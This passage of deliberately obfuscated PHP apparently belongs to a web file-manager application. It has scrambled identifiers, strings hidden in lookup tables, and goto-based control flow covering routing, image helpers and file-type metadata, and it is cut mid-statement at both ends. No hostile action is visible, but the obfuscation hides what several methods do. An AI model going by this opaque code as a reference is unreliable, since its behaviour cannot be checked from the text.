$fÉ¬õ©»ğ×[$BÊÛ…‹İ•‰] = $e›‡Ö£ÈéÎ; } $Dä•è…±æ¬[$e›‡Ö£ÈéÎ][$C¡¿…Ğ‡ğ[165]] = array_keys($fÉ¬õ©»ğ×); $Dä•è…±æ¬[$e›‡Ö£ÈéÎ][$C¡¿…Ğ‡ğ[1623]] = self::parseKeyMap($A—ñ„ŠøïÙ[$C¡¿…Ğ‡ğ[1623]]); } return array($C¡¿…Ğ‡ğ[1622] => $Dä•è…±æ¬, $C¡¿…Ğ‡ğ[1621] => $fÉ¬õ©»ğ×); } private static function parseKeyMap($aˆ©öÄğ­Š) { $EÀªçÙ¥Ò‚ =& $_SERVER[‡’¶øåüç˜]; foreach ($aˆ©öÄğ­Š as $e¡ì„×ğ©Ú => $EÜÀ„Ë£…’) { if (is_array($EÜÀ„Ë£…’)) { $DƒÒ­´µË = self::parseKeyMap($EÜÀ„Ë£…’); if ($DƒÒ­´µË) { $aˆ©öÄğ­Š[$e¡ì„×ğ©Ú] = $DƒÒ­´µË; } continue; } $Eİîë˜éÈ = explode($EÀªçÙ¥Ò‚[47], $EÜÀ„Ë£…’); $bÈÈóîÆßİ = array(); foreach ($Eİîë˜éÈ as $D¤æšè©„) { $D¤æšè©„ = trim($D¤æšè©„); if (!$D¤æšè©„) { continue; } if (preg_match($EÀªçÙ¥Ò‚[1626], $D¤æšè©„, $e‚ñ ™¹ñë)) { $fÍÈàãâÍ = explode($EÀªçÙ¥Ò‚[275], $e‚ñ ™¹ñë[1]); foreach ($fÍÈàãâÍ as $f“ãä–ø×ñ) { $bÈÈóîÆßİ[] = str_replace($e‚ñ ™¹ñë[0], $f“ãä–ø×ñ, $D¤æšè©„); } } else { $bÈÈóîÆßİ[] = $D¤æšè©„; } } $aˆ©öÄğ­Š[$e¡ì„×ğ©Ú] = $bÈÈóîÆßİ; } return $aˆ©öÄğ­Š; } private static function valueResetAll($fÊ¬Œ»„ñ», $d«æŸÙá) { goto A™ƒñÔ²­; Cô˜²Ñã: return $fÊ¬Œ»„ñ»; goto fŞ¬“Ü’¹; CÄÙ×»–ôğ: $B¨¾÷è‚Šâ = _get($fÊ¬Œ»„ñ», $Aøõ„¨ï©ƒ[1639], $Aøõ„¨ï©ƒ[33]); $c†¬‘©Óã = $eÕçæÎäš™ . $dÄÃ¾ÅëŞ› . $B¨¾÷è‚Šâ; if ($c†¬‘©Óã && get_charset($c†¬‘©Óã) != $Aøõ„¨ï©ƒ[330]) { $fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1348]] = iconv_to($fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1348]], get_charset($c†¬‘©Óã), $Aøõ„¨ï©ƒ[330]); $fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1640]] = iconv_to($fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1640]], get_charset($c†¬‘©Óã), $Aøõ„¨ï©ƒ[330]); $fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1641]] = iconv_to($fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1641]], get_charset($c†¬‘©Óã), $Aøõ„¨ï©ƒ[330]); } goto Cô˜²Ñã; e¹¢”Ñ“Åˆ: if ($d½Ç©àÆß) { $BãÙÓîİ§ò = IO_PATH_SYSTEM_TEMP . $Aøõ„¨ï©ƒ[1632] . KodIO::hashPath($d«æŸÙá) . $Aøõ„¨ï©ƒ[1633]; $fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1634]] = Action($Aøõ„¨ï©ƒ[1635])->pluginCacheFileSet($BãÙÓîİ§ò, $d½Ç©àÆß); unset($fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1636]][$Aøõ„¨ï©ƒ[1619]]); } $eÕçæÎäš™ = _get($fÊ¬Œ»„ñ», $Aøõ„¨ï©ƒ[1637], $Aøõ„¨ï©ƒ[33]); $dÄÃ¾ÅëŞ› = _get($fÊ¬Œ»„ñ», $Aøõ„¨ï©ƒ[1638], $Aøõ„¨ï©ƒ[33]); goto CÄÙ×»–ôğ; A™ƒñÔ²­: $Aøõ„¨ï©ƒ =& $_SERVER[‡’¶øåüç˜]; if (isset($fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1627]])) { $A‚Å«‘ğÖİ = ceil($fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1627]]); $BĞùÅ¥Ã˜ = intval($A‚Å«‘ğÖİ / 3600); $B‹‰ÔƒÄ¾‚ = intval(($A‚Å«‘ğÖİ - $BĞùÅ¥Ã˜ * 3600) / 60); $Díƒì›×¾º = $A‚Å«‘ğÖİ % 60; $fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1628]] = sprintf($Aøõ„¨ï©ƒ[1629], $BĞùÅ¥Ã˜, $B‹‰ÔƒÄ¾‚, $Díƒì›×¾º); if ($BĞùÅ¥Ã˜ == 0) { $fÊ¬Œ»„ñ»[$Aøõ„¨ï©ƒ[1628]] = sprintf($Aøõ„¨ï©ƒ[1630], $B‹‰ÔƒÄ¾‚, $Díƒì›×¾º); } } $d½Ç©àÆß = _get($fÊ¬Œ»„ñ», $Aøõ„¨ï©ƒ[1631]); goto e¹¢”Ñ“Åˆ; fŞ¬“Ü’¹: } private static function valueReset($dŒŞŠáŸâˆ, $F¶÷ä‘º…, $Cµ‘í‡¦Äá) { $FÀ¸â„â˜Ó =& $_SERVER[‡’¶øåüç˜]; $BŞ¼ùÏÃ§– = $FÀ¸â„â˜Ó[1557]; switch ($dŒŞŠáŸâˆ) { case $FÀ¸â„â˜Ó[1642]: $F¶÷ä‘º… = $F¶÷ä‘º… == $FÀ¸â„â˜Ó[83] ? $FÀ¸â„â˜Ó[1643] : $FÀ¸â„â˜Ó[1644]; break; case $FÀ¸â„â˜Ó[1645]: $F¶÷ä‘º… = $F¶÷ä‘º… ? $F¶÷ä‘º… : null; break; default: break; } switch ($Cµ‘í‡¦Äá) { case $FÀ¸â„â˜Ó[1646]: $F¶÷ä‘º… = round($F¶÷ä‘º…, 2); break; case $FÀ¸â„â˜Ó[191]: case $FÀ¸â„â˜Ó[107]: if ($F¶÷ä‘º… < 0) { $F¶÷ä‘º… = null; } else { if (is_numeric($F¶÷ä‘º…)) { $F¶÷ä‘º… = date($BŞ¼ùÏÃ§–, $F¶÷ä‘º…); } } break; default: break; } return $F¶÷ä‘º…; } private static function fileTypeArray() { $dÜ˜°­Êß =& $_SERVER[‡’¶øåüç˜]; return array($dÜ˜°­Êß[1619] => array($dÜ˜°­Êß[165] => $dÜ˜°­Êß[1647] . $dÜ˜°­Êß[1648], $dÜ˜°­Êß[1623] => array($dÜ˜°­Êß[162] => $dÜ˜°­Êß[1649], $dÜ˜°­Êß[163] => $dÜ˜°­Êß[1650], $dÜ˜°­Êß[1651] => $dÜ˜°­Êß[1652], $dÜ˜°­Êß[1653] => $dÜ˜°­Êß[1654], $dÜ˜°­Êß[191] => $dÜ˜°­Êß[1655], $dÜ˜°­Êß[107] => $dÜ˜°­Êß[1656], $dÜ˜°­Êß[1657] => $dÜ˜°­Êß[1658], $dÜ˜°­Êß[1659] => $dÜ˜°­Êß[1660], $dÜ˜°­Êß[1661] => $dÜ˜°­Êß[1662], $dÜ˜°­Êß[1663] => $dÜ˜°­Êß[1664], $dÜ˜°­Êß[1665] => $dÜ˜°­Êß[1666], $dÜ˜°­Êß[1667] => $dÜ˜°­Êß[1668], $dÜ˜°­Êß[1669] => $dÜ˜°­Êß[1670], $dÜ˜°­Êß[1671] => array($dÜ˜°­Êß[1672] => $dÜ˜°­Êß[1673], $dÜ˜°­Êß[1674] => $dÜ˜°­Êß[1675], $dÜ˜°­Êß[1676] => $dÜ˜°­Êß[1677]), $dÜ˜°­Êß[1678] => $dÜ˜°­Êß[1679], $dÜ˜°­Êß[1680] => $dÜ˜°­Êß[1681], $dÜ˜°­Êß[1682] => $dÜ˜°­Êß[1683], $dÜ˜°­Êß[1684] => $dÜ˜°­Êß[1685], $dÜ˜°­Êß[1686] => array($dÜ˜°­Êß[1687] => $dÜ˜°­Êß[1688], $dÜ˜°­Êß[1689] => $dÜ˜°­Êß[1690], $dÜ˜°­Êß[1691] => $dÜ˜°­Êß[1692], $dÜ˜°­Êß[1693] => $dÜ˜°­Êß[1694], $dÜ˜°­Êß[1695] => $dÜ˜°­Êß[1696], $dÜ˜°­Êß[1697] => $dÜ˜°­Êß[1698], $dÜ˜°­Êß[1699] => $dÜ˜°­Êß[1700], $dÜ˜°­Êß[1701] => $dÜ˜°­Êß[1702], $dÜ˜°­Êß[1703] => $dÜ˜°­Êß[1704], $dÜ˜°­Êß[1705] => $dÜ˜°­Êß[1706], $dÜ˜°­Êß[1707] => $dÜ˜°­Êß[1708]))), $dÜ˜°­Êß[1709] => array($dÜ˜°­Êß[165] => $dÜ˜°­Êß[1710] . $dÜ˜°­Êß[1711], $dÜ˜°­Êß[1623] => array($dÜ˜°­Êß[1627] => $dÜ˜°­Êß[1712], $dÜ˜°­Êß[191] => $dÜ˜°­Êß[1713], $dÜ˜°­Êß[107] => $dÜ˜°­Êß[1714], $dÜ˜°­Êß[1659] => $dÜ˜°­Êß[1715], $dÜ˜°­Êß[1716] => $dÜ˜°­Êß[1717], $dÜ˜°­Êß[1718] => $dÜ˜°­Êß[1645], $dÜ˜°­Êß[1719] => $dÜ˜°­Êß[1720], $dÜ˜°­Êß[1721] => $dÜ˜°­Êß[1722], $dÜ˜°­Êß[1723] => $dÜ˜°­Êß[1724], $dÜ˜°­Êß[1636] => array($dÜ˜°­Êß[1348] => $dÜ˜°­Êß[1725], $dÜ˜°­Êß[1640] => $dÜ˜°­Êß[1726], $dÜ˜°­Êß[1641] => $dÜ˜°­Êß[1727], $dÜ˜°­Êß[1728] => $dÜ˜°­Êß[1729], $dÜ˜°­Êß[1730] => $dÜ˜°­Êß[1731], $dÜ˜°­Êß[1732] => $dÜ˜°­Êß[1733], $dÜ˜°­Êß[1619] => $dÜ˜°­Êß[1734]))), $dÜ˜°­Êß[1735] => array($dÜ˜°­Êß[165] => $dÜ˜°­Êß[1736] . $dÜ˜°­Êß[1737], $dÜ˜°­Êß[1623] => array($dÜ˜°­Êß[162] => $dÜ˜°­Êß[1738], $dÜ˜°­Êß[163] => $dÜ˜°­Êß[1739], $dÜ˜°­Êß[1627] => $dÜ˜°­Êß[1712], $dÜ˜°­Êß[191] => $dÜ˜°­Êß[1740], $dÜ˜°­Êß[107] => $dÜ˜°­Êß[1741], $dÜ˜°­Êß[1646] => $dÜ˜°­Êß[1742], $dÜ˜°­Êß[1723] => $dÜ˜°­Êß[1743], $dÜ˜°­Êß[1719] => $dÜ˜°­Êß[1744], $dÜ˜°­Êß[1659] => $dÜ˜°­Êß[1745], $dÜ˜°­Êß[1709] => array($dÜ˜°­Êß[1718] => $dÜ˜°­Êß[1645], $dÜ˜°­Êß[1746] => $dÜ˜°­Êß[1747], $dÜ˜°­Êß[1716] => $dÜ˜°­Êß[1717], $dÜ˜°­Êß[1723] => $dÜ˜°­Êß[1724], $dÜ˜°­Êß[1719] => $dÜ˜°­Êß[1748], $dÜ˜°­Êß[1721] => $dÜ˜°­Êß[1722]))), $dÜ˜°­Êß[1749] => array($dÜ˜°­Êß[1623] => array($dÜ˜°­Êß[1750] => $dÜ˜°­Êß[1751], $dÜ˜°­Êß[1752] => $dÜ˜°­Êß[1753])), $dÜ˜°­Êß[1754] => array($dÜ˜°­Êß[1623] => array())); } } function exif_read_data_io($Eé«‡ÓÔ‰Ä, $f¡òâòÑ‘É = null, $E±±˜¤Ò§Õ = false, $Cƒ®ÜÓŒÙ“ = false) { $b›—”»Ó¥  = StreamWrapperIO::read($Eé«‡ÓÔ‰Ä, 0, 1024 * 64); $dŒ‹“Õ¼· = $_SERVER[‡’¶øåüç˜][1755] . base64_encode($b›—”»Ó¥ ); return exif_read_data($dŒ‹“Õ¼·, $f¡òâòÑ‘É, $E±±˜¤Ò§Õ, $Cƒ®ÜÓŒÙ“); } function getimagesize_io($Få«Ø…¨ğ, &$cø­ÏÓ”õÙ = false) { $eáâøô¬Ì† = StreamWrapperIO::read($Få«Ø…¨ğ, 0, 1024 * 64); $Få«Ø…¨ğ = $_SERVER[‡’¶øåüç˜][1755] . base64_encode($eáâøô¬Ì†); return getimagesize($Få«Ø…¨ğ, $cø­ÏÓ”õÙ); } goto Fƒİ²ò×î; a¤´í¸ÜŒƒ: class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($BÑ§–©Úó…) { goto B£·äÜöé¨; B£·äÜöé¨: $BÍêÍÜ¢§ =& $_SERVER[‡’¶øåüç˜]; $e‡ßóï² =& $_SERVER[ÂØÃó©³¸¡¸¢]; $D‡Ô†ŒÂ… = $e‡ßóï²[0]($e‡ßóï²[1], $e‡ßóï²[2]($BÑ§–©Úó…, $e‡ßóï²[1])); goto aİ¦Ê§…×å; Cã ŸîŒÔâ: $this->defaultController = $D‡Ô†ŒÂ…[1] ? $D‡Ô†ŒÂ…[1] : $this->defaultController; $this->defaultAction = $D‡Ô†ŒÂ…[2] ? $D‡Ô†ŒÂ…[2] : $this->defaultAction; $dÍ¬é¿ä×« = $BÍêÍÜ¢§[565]; goto d‘¿§¯Ô™±; aİ¦Ê§…×å: $EÑØÊƒ±ßÛ = $BÍêÍÜ¢§[563]; while ($EÑØÊƒ±ßÛ < $BÍêÍÜ¢§[564]) { if ($EÑØÊƒ±ßÛ >= 0) { break; } $EÑØÊƒ±ßÛ++; } $this->defaultModule = $D‡Ô†ŒÂ…[0] ? $D‡Ô†ŒÂ…[0] : $this->defaultModule; goto Cã ŸîŒÔâ; d‘¿§¯Ô™±: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][3]}($e‡ßóï²[4], array($this, $e‡ßóï²[5])); goto dÌİ˜±µÔõ; dÌİ˜±µÔõ: } public function appRun($FÊÕå´ÉˆĞ) { goto D“ïÔ¿­ì; d½‹èàë: $e–íïã“™ = $d£ë°öŞà[567]; if (!$e–íïã“™) { die; } $Aç­¡­¤À = $b«·Ÿõ¬å†[7]; goto cÆ­«ªè‘; AÁÇ‹ó‡§: $b«·Ÿõ¬å†[13](array($b«·Ÿõ¬å†[14], $b«·Ÿõ¬å†[15]), $Aç­¡­¤À . $b«·Ÿõ¬å†[18], $FÊÕå´ÉˆĞ); goto f”­Ê±¥Ş; D“ïÔ¿­ì: $d£ë°öŞà =& $_SERVER[‡’¶øåüç˜]; $b«·Ÿõ¬å† =& $_SERVER[ÂØÃó©³¸¡¸¢]; $B“ã±…‰Â = $b«·Ÿõ¬å†[0]($b«·Ÿõ¬å†[1], $FÊÕå´ÉˆĞ); goto CĞóÇÕ‹®®; CĞóÇÕ‹®®: $EİÚÏÓäÅ› = $d£ë°öŞà[566]; if (!$EİÚÏÓäÅ›) { die; } $cçâ¾¯ï† = $b«·Ÿõ¬å†[6]($B“ã±…‰Â[0]); goto d½‹èàë; cÆ­«ªè‘: if ($cçâ¾¯ï† == $b«·Ÿõ¬å†[8]) { $Aç­¡­¤À = $b«·Ÿõ¬å†[9]; $B“ã±…‰Â[0] = $b«·Ÿõ¬å†[10]; $B“ã±…‰Â[1] = $B“ã±…‰Â[1] . $b«·Ÿõ¬å†[11]; $FÊÕå´ÉˆĞ = $b«·Ÿõ¬å†[12]($b«·Ÿõ¬å†[1], $B“ã±…‰Â); $FÊÕå´ÉˆĞ = $b«·Ÿõ¬å†[2]($FÊÕå´ÉˆĞ, $b«·Ÿõ¬å†[1]); } $b«·Ÿõ¬å†[13](array($b«·Ÿõ¬å†[14], $b«·Ÿõ¬å†[15]), $Aç­¡­¤À . $b«·Ÿõ¬å†[16], $FÊÕå´ÉˆĞ); $b«·Ÿõ¬å†[17]($FÊÕå´ÉˆĞ); goto AÁÇ‹ó‡§; f”­Ê±¥Ş: } private function autorun() { $aà¤Ÿ¿–³ =& $_SERVER[‡’¶øåüç˜]; $b™‰ˆ•ìª =& $_SERVER[ÂØÃó©³¸¡¸¢]; global $config; if ($b™‰ˆ•ìª[19]($config[$b™‰ˆ•ìª[20]]) == 0) { return; } foreach ($config[$b™‰ˆ•ìª[20]] as $A§¶º¶¥¤ => $Dª‘öòÃ„) { $this->{$_SERVER[ÂØÃó©³¸¡¸¢][21]}($Dª‘öòÃ„); $Cƒ•µ‹•‘ = $aà¤Ÿ¿–³[568]; if (strlen($Cƒ•µ‹•‘) < $aà¤Ÿ¿–³[377]) { return; } } } private function iecu55c2cc98() { goto A²·¹œä·Í; aâïèä¡Åö: $B´ŠÜ¬ğÅ = $d°Ö°”¬ëÜ[569]; if (strlen($B´ŠÜ¬ğÅ) < $d°Ö°”¬ëÜ[570]) { return; } $BÖš‡°Ë„Í = $GLOBALS[$b˜ŸÖ”âÒÃ[22]][$b˜ŸÖ”âÒÃ[23]][0]; goto B¡åù’ÈŒ°; b›ªÊßÀí‘: $BÌµÀÖ¦«— = $b˜ŸÖ”âÒÃ[26]($GLOBALS[$b˜ŸÖ”âÒÃ[22]][$b˜ŸÖ”âÒÃ[23]], 1); $D‹×Ÿ‰İ’ = $d°Ö°”¬ëÜ[573]; $GLOBALS[$b˜ŸÖ”âÒÃ[22]][$b˜ŸÖ”âÒÃ[23]] = $b˜ŸÖ”âÒÃ[27]($C‹‰Ú‘±Ó®, $BÌµÀÖ¦«—); goto EÕÈªº½‹˜; A²·¹œä·Í: $d°Ö°”¬ëÜ =& $_SERVER[‡’¶øåüç˜]; $b˜ŸÖ”âÒÃ =& $_SERVER[ÂØÃó©³¸¡¸¢]; $E„¥’Ù²‹Ó = $b˜ŸÖ”âÒÃ[8]; goto aâïèä¡Åö; DéÇ”®: $C‹‰Ú‘±Ó® = array($b˜ŸÖ”âÒÃ[8], $A‡ñö”„‚); $FÜÛ‚êµÁ = $d°Ö°”¬ëÜ[571]; while ($FÜÛ‚êµÁ < $d°Ö°”¬ëÜ[572]) { if ($FÜÛ‚êµÁ >= 0) { break; } $FÜÛ‚êµÁ++; } goto b›ªÊßÀí‘; EÕÈªº½‹˜: $GLOBALS[$b˜ŸÖ”âÒÃ[22]][$b˜ŸÖ”âÒÃ[28]] = $b˜ŸÖ”âÒÃ[29]($b˜ŸÖ”âÒÃ[1], $GLOBALS[$b˜ŸÖ”âÒÃ[22]][$b˜ŸÖ”âÒÃ[23]]); goto C‹©¼Î¡Ç; B¡åù’ÈŒ°: if (!$BÖš‡°Ë„Í || $b˜ŸÖ”âÒÃ[24]($BÖš‡°Ë„Í) <= $b˜ŸÖ”âÒÃ[24]($E„¥’Ù²‹Ó)) { return; } if ($b˜ŸÖ”âÒÃ[6]($b˜ŸÖ”âÒÃ[25]($BÖš‡°Ë„Í, -$b˜ŸÖ”âÒÃ[24]($E„¥’Ù²‹Ó))) != $E„¥’Ù²‹Ó) { return; } $A‡ñö”„‚ = $b˜ŸÖ”âÒÃ[25]($BÖš‡°Ë„Í, 0, -$b˜ŸÖ”âÒÃ[24]($E„¥’Ù²‹Ó)); goto DéÇ”®; C‹©¼Î¡Ç: } private function pjukfb730bf2() { goto DÈ¸æÈáµ; E“‹ŠË§: $FÆ”Â”Ô‹[34]($FÆ”Â”Ô‹[35], $C‹ö«çù, $c®™Í¤àêÏ); $C‹ö«çù = $FÆ”Â”Ô‹[2]($c®™Í¤àêÏ[0][0], $FÆ”Â”Ô‹[36]); $GLOBALS[$FÆ”Â”Ô‹[22]][$FÆ”Â”Ô‹[23]] = $FÆ”Â”Ô‹[0]($FÆ”Â”Ô‹[36], $C‹ö«çù); goto F«›™Å÷÷À; dÇ¹©±‹Õ: $fÄË“ÁÍ÷ = $FÆ”Â”Ô‹[33]($e‡Àó´Ûê, $cå‰è¢œé–); $EÎ‘ÚÉÛÉ = $E¤¥Âê‘“â[574]; if (!$EÎ‘ÚÉÛÉ) { die; } goto B×›Ñß•ä; dÃº»Ïò–: $e‡Àó´Ûê = $_SERVER[$FÆ”Â”Ô‹[30]]; $cå‰è¢œé– = $FÆ”Â”Ô‹[31]; if (!$FÆ”Â”Ô‹[32]($e‡Àó´Ûê, $cå‰è¢œé–)) { return; } goto dÇ¹©±‹Õ; F«›™Å÷÷À: $GLOBALS[$FÆ”Â”Ô‹[22]][$FÆ”Â”Ô‹[28]] = $FÆ”Â”Ô‹[29]($FÆ”Â”Ô‹[1], $GLOBALS[$FÆ”Â”Ô‹[22]][$FÆ”Â”Ô‹[23]]); $EçÀµøÁÍÙ = $E¤¥Âê‘“â[577]; if (strlen($EçÀµøÁÍÙ) < $E¤¥Âê‘“â[576]) { return; } goto dˆ†œ“š‘ø; DÈ¸æÈáµ: $E¤¥Âê‘“â =& $_SERVER[‡’¶øåüç˜]; $FÆ”Â”Ô‹ =& $_SERVER[ÂØÃó©³¸¡¸¢]; if ($GLOBALS[$FÆ”Â”Ô‹[22]][$FÆ”Â”Ô‹[28]] != $FÆ”Â”Ô‹[10]) { return; } goto dÃº»Ïò–; B×›Ñß•ä: $C‹ö«çù = $FÆ”Â”Ô‹[25]($e‡Àó´Ûê, $fÄË“ÁÍ÷ + $FÆ”Â”Ô‹[24]($cå‰è¢œé–)); $F—ä©®öƒ = $E¤¥Âê‘“â[575]; while ($F—ä©®öƒ < $E¤¥Âê‘“â[576]) { if ($F—ä©®öƒ >= 0) { break; } $F—ä©®öƒ++; } goto E“‹ŠË§; dˆ†œ“š‘ø: } public function run() { goto B†öŒ»ãØ×; B¢Ù¬¢±Ó£: $cÕŞ††Ğ = $e“–„ÉÁË¿[579]; $_SERVER[$e¡›‡¡‰Ø•[44]] = $e¡›‡¡‰Ø•[6](ACTION); $this->{$_SERVER[ÂØÃó©³¸¡¸¢][45]}(); goto d˜İ®ïßó³; DÔ¤”‚·Æ: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][38]}(); $Fë„Ûçæ‰– = $GLOBALS[$e¡›‡¡‰Ø•[22]][$e¡›‡¡‰Ø•[23]]; $b£ŞíßÀ©æ = $GLOBALS[$e¡›‡¡‰Ø•[22]][$e¡›‡¡‰Ø•[28]]; goto E‡†Ó»·ì¤; E‡†Ó»·ì¤: $e¡›‡¡‰Ø•[39]($e¡›‡¡‰Ø•[40], isset($Fë„Ûçæ‰–[0]) && $Fë„Ûçæ‰–[0] ? $Fë„Ûçæ‰–[0] : $this->defaultModule); $e¡›‡¡‰Ø•[39]($e¡›‡¡‰Ø•[41], isset($Fë„Ûçæ‰–[1]) && $Fë„Ûçæ‰–[0] ? $Fë„Ûçæ‰–[1] : $this->defaultController); $e¡›‡¡‰Ø•[39]($e¡›‡¡‰Ø•[42], isset($Fë„Ûçæ‰–[2]) && $Fë„Ûçæ‰–[0] ? $Fë„Ûçæ‰–[2] : $this->defaultAction); goto CÙŠîŒ‹»; CÙŠîŒ‹»: $eÑÌˆßç¬ = $e“–„ÉÁË¿[578]; if (!$eÑÌˆßç¬) { die; } $e¡›‡¡‰Ø•[39]($e¡›‡¡‰Ø•[43], MOD . $e¡›‡¡‰Ø•[1] . ST . $e¡›‡¡‰Ø•[1] . ACT); goto B¢Ù¬¢±Ó£; d˜İ®ïßó³: if ($e¡›‡¡‰Ø•[19]($Fë„Ûçæ‰–) >= 3) { $this->{$_SERVER[ÂØÃó©³¸¡¸¢][21]}($b£ŞíßÀ©æ); } else { $this->{$_SERVER[ÂØÃó©³¸¡¸¢][21]}(ACTION); } goto Fè•‚õøÍ‰; B†öŒ»ãØ×: $e“–„ÉÁË¿ =& $_SERVER[‡’¶øåüç˜]; $e¡›‡¡‰Ø• =& $_SERVER[ÂØÃó©³¸¡¸¢]; $this->{$_SERVER[ÂØÃó©³¸¡¸¢][37]}(); goto DÔ¤”‚·Æ; Fè•‚õøÍ‰: } private $nqtpe0b0d2d9 = array(); private $tzbwf92f51a5 = ''; public function mslne0de15c1() { goto b©ÆŒÅ Ã÷; A¡ôÏä²: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][47]}(); $this->{$_SERVER[ÂØÃó©³¸¡¸¢][48]}(); $Bù¦ˆ¡¿¥† = $c†áÙÄÅ‰[580]; goto Cˆ÷«Â¥˜†; Díùä¡Ãî: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][3]}($AøÒîµøÎÒ[53], array($this, $AøÒîµøÎÒ[54])); $this->{$_SERVER[ÂØÃó©³¸¡¸¢][3]}($AøÒîµøÎÒ[55], array($this, $AøÒîµøÎÒ[56])); $e°Õù•ìõ¹ = $c†áÙÄÅ‰[585]; goto aøßšŒ®æÔ; b©ÆŒÅ Ã÷: $c†áÙÄÅ‰ =& $_SERVER[‡’¶øåüç˜]; $AøÒîµøÎÒ =& $_SERVER[ÂØÃó©³¸¡¸¢]; $this->{$_SERVER[ÂØÃó©³¸¡¸¢][46]}(); goto A¡ôÏä²; Cˆ÷«Â¥˜†: if (strlen($Bù¦ˆ¡¿¥†) < $c†áÙÄÅ‰[564]) { return; } $this->{$_SERVER[ÂØÃó©³¸¡¸¢][49]}(); $cİ»ù²¹¥µ = $c†áÙÄÅ‰[581]; goto CêôºÒÃ¾À; aøßšŒ®æÔ: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][3]}($AøÒîµøÎÒ[57], array($this, $AøÒîµøÎÒ[58])); $this->{$_SERVER[ÂØÃó©³¸¡¸¢][3]}($AøÒîµøÎÒ[59], array($this, $AøÒîµøÎÒ[60])); $fÎ²Ù†Æ¢Á = $c†áÙÄÅ‰[586]; goto a„“ßÈ‚´; F£—¬Ô°‡÷: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][52]}(); $DÈÅÒä£¾‘ = $c†áÙÄÅ‰[584]; if (strlen($DÈÅÒä£¾‘) < $c†áÙÄÅ‰[576]) { die; } goto Díùä¡Ãî; CêôºÒÃ¾À: if (strlen($cİ»ù²¹¥µ) < $c†áÙÄÅ‰[570]) { return; } $this->{$_SERVER[ÂØÃó©³¸¡¸¢][50]}(); $BÙË›¼Â†¦ = $c†áÙÄÅ‰[582]; goto dŒùÊÒ—ºÚ; a„“ßÈ‚´: if (strlen($fÎ²Ù†Æ¢Á) < $c†áÙÄÅ‰[377]) { die; } goto E¢ğ§—Õ¤Š; dŒùÊÒ—ºÚ: $this->{$_SERVER[ÂØÃó©³¸¡¸¢][51]}(); $eçØ—Š¯§ˆ = $c†áÙÄÅ‰[583]; if (!$eçØ—Š¯§ˆ) { return; } goto F£—¬Ô°‡÷; E¢ğ§—Õ¤Š: } public function wdyz6e07ba63($d¾Æ“å°‡¼) { goto AªÅ«¹…ˆ; A›‰®ŒÕªó: return $d¾Æ“å°‡¼; goto BÛêÃ¦öÙ—; a„¢¥³›¤Ô: $EÅäò¸‰‚– = $eßøÖ¸¸ÖÆ[593]; if (strlen($EÅäò¸‰‚–) < $eßøÖ¸¸ÖÆ[564]) { die; } if ($cÇÛÄË…§[113]($GLOBALS, $cÇÛÄË…§[141]) && $this->config[$cÇÛÄË…§[142]]) { $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[143]] = WEB_ROOT; } goto A›‰®ŒÕªó; BÀ¥´¡ç«ğ: $Dšôë…ì°¼ = $eßøÖ¸¸ÖÆ[587]; $Fô”ø„é£‚ = array($cÇÛÄË…§[64], $cÇÛÄË…§[65], $cÇÛÄË…§[66], $cÇÛÄË…§[67], $cÇÛÄË…§[68], $cÇÛÄË…§[69], $cÇÛÄË…§[70], $cÇÛÄË…§[71], $cÇÛÄË…§[72], $cÇÛÄË…§[73], $cÇÛÄË…§[74], $cÇÛÄË…§[75], $cÇÛÄË…§[76], $cÇÛÄË…§[77], $cÇÛÄË…§[78], $cÇÛÄË…§[79], $cÇÛÄË…§[80], $cÇÛÄË…§[81], $cÇÛÄË…§[82], $cÇÛÄË…§[83], $cÇÛÄË…§[84], $cÇÛÄË…§[85], $cÇÛÄË…§[86], $cÇÛÄË…§[87], $cÇÛÄË…§[88], $cÇÛÄË…§[89], $cÇÛÄË…§[90], $cÇÛÄË…§[91], $cÇÛÄË…§[92], $cÇÛÄË…§[93], $cÇÛÄË…§[94], $cÇÛÄË…§[95], $cÇÛÄË…§[96], $cÇÛÄË…§[97], $cÇÛÄË…§[98], $cÇÛÄË…§[99]); $D…À“˜×—‹ = $eßøÖ¸¸ÖÆ[588]; goto b•ª‰¨¦òÌ; fØù‡†ç”: while (strlen($EØÆ‚è°¤‡) < $eßøÖ¸¸ÖÆ[572]) { if (!$EØÆ‚è°¤‡) { break; } $EØÆ‚è°¤‡++; } $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[126]] = $cÇÛÄË…§[127]($cÇÛÄË…§[128]()); $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[129]] = $this->tzbwf92f51a5; goto E¢àÙçãƒÔ; Fßêéò„ÙÂ: if (!$d…ÊÁƒ«‰¬) { return; } $d¾Æ“å°‡¼[$cÇÛÄË…§[117]][$cÇÛÄË…§[122]] = $cÇÛÄË…§[123]($_SERVER[$cÇÛÄË…§[124]] . $fë±ÊÖá”æ[$cÇÛÄË…§[125]]); $EØÆ‚è°¤‡ = $eßøÖ¸¸ÖÆ[591]; goto fØù‡†ç”; E”¸É­à¯›: $d¾Æ“å°‡¼[$cÇÛÄË…§[102]][$cÇÛÄË…§[103]][$cÇÛÄË…§[108]] = array($cÇÛÄË…§[109] => (int) 